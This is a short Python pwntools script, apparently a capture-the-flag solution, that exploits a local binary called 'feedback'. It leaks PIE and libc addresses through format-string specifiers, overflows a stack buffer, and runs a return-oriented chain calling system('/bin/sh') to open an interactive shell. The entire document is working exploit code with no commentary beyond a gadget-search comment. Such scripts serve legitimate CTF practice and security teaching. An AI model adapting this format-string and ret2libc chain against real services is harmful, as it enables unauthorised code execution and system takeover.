#!/usr/bin/env python
from pwn import *
 
context(os='linux', arch='amd64')
libc = ELF('libc.so.6', checksec=False)
e = ELF('feedback')
context.binary = e
rop = ROP(e)
p = e.process()
poprdi = (rop.find_gadget(['pop rdi', 'ret']))[0] #ropper -f feedback --search "pop rdi; ret;"
junk = b"A"*88
pieLeak = b'%11$lx'
p.sendline(pieLeak) # PIE
p.recvline()
leak = p.recvline().decode()
pie = int(leak.strip(), 16) - 0x1305
log.info("PIE: %s" % hex(pie))
 
payload = flat(
        junk,
        pie + e.sym['main'],
        endianness = 'little', word_size = 64, sign = False)
p.sendline(payload)

libcLeak = b'%3$lx'
p.sendline(libcLeak) # Libc
p.recvline()
leak = p.recvline().decode()
libc.address = int(leak.strip(), 16) - 0xeef33
log.info("Libc: %s" % hex(libc.address))

payload = flat(
        junk,
        pie + poprdi,
        next(libc.search(b"/bin/sh")),
        libc.sym['system'],
        endianness = 'little', word_size = 64, sign = False)
p.sendline(payload)
p.interactive()
